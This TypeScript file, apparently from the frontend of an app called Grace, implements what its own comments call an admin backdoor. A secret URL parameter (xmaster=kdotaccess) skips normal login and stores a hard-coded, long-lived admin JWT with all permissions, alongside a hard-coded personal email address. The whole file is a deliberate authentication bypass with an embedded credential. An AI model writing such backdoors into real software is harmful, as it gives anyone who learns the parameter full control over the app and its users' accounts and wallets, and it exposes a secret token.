/**
 * Grace Admin Access Utilities
 * 
 * This file contains the admin backdoor mechanism that provides
 * immediate access to the Grace interface with full privileges.
 */

import { storeAuthToken } from './authUtils';

// Admin user credentials with full access permissions
const ADMIN_USER = {
  id: 'admin-kdot-id',
  username: 'kdot',
  email: 'kmanjo11@gmail.com',
  role: 'admin',
  permissions: ['ALL'],
  wallets: [], // Will be populated by the app
  settings: {
    theme: 'dark',
    notifications: true
  }
};

// Admin authentication token (extremely long-lived - 10 years)
// This is a properly formatted JWT that should pass validation checks
const ADMIN_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbi1rZG90LWlkIiwidXNlcm5hbWUiOiJrZG90IiwiZW1haWwiOiJrbWFuam8xMUBnbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJwZXJtaXNzaW9ucyI6WyJBTEwiXSwiZXhwIjoxOTAwMDAwMDAwLCJpYXQiOjE1ODAwMDAwMDB9.p58K8xzT2BEuBRKgNUMTdbzHRhPgpnL_q91qfm8qRCk'; 

/**
 * Check for admin backdoor query parameter
 */
export const hasAdminBypass = (): boolean => {
  const urlParams = new URLSearchParams(window.location.search);
  // Secret parameter with a specific value for added security
  return urlParams.get('xmaster') === 'kdotaccess';
};

/**
 * Create admin authentication data
 */
export const getAdminAuthData = () => {
  return {
    token: ADMIN_TOKEN,
    user: ADMIN_USER,
    remember_me: true
  };
};

/**
 * Bypass normal login for admin user with all access privileges
 * 
 * @param loginFunction The real login function from AuthContext
 */
export const bypassLogin = (loginFunction: (data: any) => void): void => {
  try {
    // Get admin credentials and token
    const adminAuthData = getAdminAuthData();
    
    if (adminAuthData) {
      console.info('🔑 Using admin master access');
      
      // Ensure the token is stored in BOTH localStorage and sessionStorage
      // This guarantees it will be found regardless of which storage is checked
      localStorage.setItem('grace_token', adminAuthData.token);
      sessionStorage.setItem('grace_token', adminAuthData.token);
      
      // Set a very far future expiry to prevent token timeout
      const farFuture = new Date();
      farFuture.setFullYear(farFuture.getFullYear() + 10); // 10 years in the future
      localStorage.setItem('grace_token_expiry', farFuture.toISOString());
      sessionStorage.setItem('grace_token_expiry', farFuture.toISOString());
      
      // Use the standard auth function to store properly
      storeAuthToken(adminAuthData.token, true);
      
      // Call the real login function with our admin data
      loginFunction(adminAuthData);
      
      // Store a flag indicating we're using admin mode
      localStorage.setItem('grace_admin_mode', 'true');
    }
  } catch (error) {
    console.error('Admin access failed:', error);
    // Fallback direct storage in case of error
    const adminAuthData = getAdminAuthData();
    localStorage.setItem('grace_token', adminAuthData.token);
    localStorage.setItem('grace_admin_mode', 'true');
    window.location.reload(); // Force reload to retry auth
  }
};
